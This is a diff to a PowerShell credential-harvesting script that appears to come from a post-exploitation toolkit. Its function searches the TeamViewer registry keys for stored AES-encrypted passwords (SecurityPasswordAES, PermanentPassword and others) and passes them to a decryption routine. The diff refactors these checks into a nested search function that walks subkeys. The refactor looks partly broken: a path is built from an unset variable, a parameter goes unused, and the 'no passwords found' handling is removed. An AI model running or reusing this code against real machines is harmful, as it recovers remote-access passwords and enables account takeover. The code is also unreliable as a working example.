@@ -1,97 +1,100 @@
 function TeamviewerDecrypt
 {
+
+function search
+{
+
+    
+    $path = "Registry::" + $TeamviewerDir
+    try
+    {
+        $TeamviewerDir = Get-Itemproperty $path
+    }
+    catch
+    {
+
+    }
+     if ($TeamviewerDir.SecurityPasswordAES)
+     {
+         Write-Host "SecurityPasswordAES found, trying to decrypt:"
+         decryptpass -encpass $TeamviewerDir.SecurityPasswordAES
+     }
+     elseif($TeamviewerDir.OptionsPasswordAES)
+     {
+         Write-Host "OptionsPasswordAES found, trying to decrypt:"
+         decryptpass -encpass $TeamviewerDir.OptionsPasswordAES
+     }
+     elseif($TeamviewerDir.SecurityPasswordExported)
+     {
+         Write-Host "SecurityPasswordExported found, trying to decrypt:"
+         decryptpass -encpass $TeamviewerDir.SecurityPasswordExported
+     }
+     elseif($TeamviewerDir.PermanentPassword)
+     {
+         Write-Host "PermanentPassword found, trying to decrypt:"
+         decryptpass -encpass $TeamviewerDir.PermanentPassword
+     }
+    
+}
     Write-Host "Looking for Registry entries on this system:"
     if ((Test-Path Registry::'HKCU:\SOFTWARE\Teamviewer\') -Or (Test-Path Registry::'HKLM\SOFTWARE\WOW6432Node\TeamViewer') -Or (Test-Path Registry::'HKLM\SOFTWARE\TeamViewer'))
     {
         $success = $false
         if (Test-Path Registry::'HKCU:\SOFTWARE\Teamviewer\')
         {
-            $TeamviewerDir = Get-ItemProperty Registry::HKCU\Software\Teamviewer\
-            if ($TeamviewerDir.SecurityPasswordAES)
+            $TeamviewerDirs = Get-ChildItem Registry::'HKCU:\SOFTWARE\Teamviewer\'
+            if ($TeamviewerDirs -eq $null)
             {
-                Write-Host "SecurityPasswordAES found, trying to decrypt:"
-                decryptpass -encpass $TeamviewerDir.SecurityPasswordAES
-                $success = $true
+                $TeamviewerDir = Get-ItemProperty Registry::HKCU\Software\Teamviewer\
+                Search
             }
-            elseif($TeamviewerDir.OptionsPasswordAES)
+            else
             {
-                Write-Host "OptionsPasswordAES found, trying to decrypt:"
-                decryptpass -encpass $TeamviewerDir.OptionsPasswordAES
-                $success = $true
-            }
-            elseif($TeamviewerDir.SecurityPasswordExported)
-            {
-                Write-Host "SecurityPasswordExported found, trying to decrypt:"
-                decryptpass -encpass $TeamviewerDir.SecurityPasswordExported
-                $success = $true
-            }
-            elseif($TeamviewerDir.PermanentPassword)
-            {
-                Write-Host "PermanentPassword found, trying to decrypt:"
-                decryptpass -encpass $TeamviewerDir.PermanentPassword
-                $success = $true
+                foreach ($TeamviewerDir in $TeamviewerDirs)
+                {
+                    Search
+                    $TeamviewerDir = 'Registry::HKCU\Software\Teamviewer\'
+                    Search
+                }
             }
         }
         elseif (Test-Path Registry::'HKLM\SOFTWARE\WOW6432Node\TeamViewer')
         {
-            $TeamviewerDir = Get-ItemProperty Registry::HKLM\SOFTWARE\WOW6432Node\TeamViewer
-            if ($TeamviewerDir.SecurityPasswordAES)
+            $TeamviewerDirs = Get-ChildItem Registry::'HKLM\SOFTWARE\WOW6432Node\TeamViewer'
+            if ($TeamviewerDirs -eq $null)
             {
-                Write-Host "SecurityPasswordAES found, trying to decrypt:"
-                decryptpass -encpass $TeamviewerDir.SecurityPasswordAES
-                $success = $true
+                $TeamviewerDir = Get-ItemProperty Registry::HKLM\SOFTWARE\WOW6432Node\TeamViewer
+                Search -dir $TeamviewerDir
             }
-            elseif($TeamviewerDir.OptionsPasswordAES)
+            else
             {
-                Write-Host "OptionsPasswordAES found, trying to decrypt:"
-                decryptpass -encpass $TeamviewerDir.OptionsPasswordAES
-                $success = $true
-            }
-            elseif($TeamviewerDir.SecurityPasswordExported)
-            {
-                Write-Host "SecurityPasswordExported found, trying to decrypt:"
-                decryptpass -encpass $TeamviewerDir.SecurityPasswordExported
-                $success = $true
-            }
-            elseif($TeamviewerDir.PermanentPassword)
-            {
-                Write-Host "PermanentPassword found, trying to decrypt:"
-                decryptpass -encpass $TeamviewerDir.PermanentPassword
-                $success = $true
+                foreach ($TeamviewerDir in $TeamviewerDirs)
+                {
+                    Search
+                    $TeamviewerDir = Get-ItemProperty Registry::HKLM\SOFTWARE\WOW6432Node\TeamViewer\
+                    Search
+                }
             }
         }
         else
         {
-            $TeamviewerDir = Get-ItemProperty Registry::HKLM\SOFTWARE\TeamViewer
-            if ($TeamviewerDir.SecurityPasswordAES)
+            $TeamviewerDirs = Get-ChildItem Registry::HKLM\SOFTWARE\TeamViewer
+            if ($TeamviewerDirs -eq $null)
             {
-                Write-Host "SecurityPasswordAES found, trying to decrypt:"
-                decryptpass -encpass $TeamviewerDir.SecurityPasswordAES
-                $success = $true
+                $TeamviewerDir = Get-ItemProperty Registry::HKLM\SOFTWARE\TeamViewer
+                Search
             }
-            elseif($TeamviewerDir.OptionsPasswordAES)
+            else
             {
-                Write-Host "OptionsPasswordAES found, trying to decrypt:"
-                decryptpass -encpass $TeamviewerDir.OptionsPasswordAES
-                $success = $true
-            }
-            elseif($TeamviewerDir.SecurityPasswordExported)
-            {
-                Write-Host "SecurityPasswordExported found, trying to decrypt:"
-                decryptpass -encpass $TeamviewerDir.SecurityPasswordExported
-                $success = $true
-            }
-            elseif($TeamviewerDir.PermanentPassword)
-            {
-                Write-Host "PermanentPassword found, trying to decrypt:"
-                decryptpass -encpass $TeamviewerDir.PermanentPassword
-                $success = $true
+                foreach ($TeamviewerDir in $TeamviewerDirs)
+                {
+                    Search
+                    $TeamviewerDir = Get-ItemProperty Registry::HKLM\SOFTWARE\TeamViewer
+                    Search
+                }
             }
         }
-        if ($success -eq $false)
-        {
-            Write-Host "Sorry, no passwords found"
-        }
+
     }
     else
     {
@@ -99,6 +102,7 @@ function TeamviewerDecrypt
     }
 
 }
+
 
 function decryptpass
 {
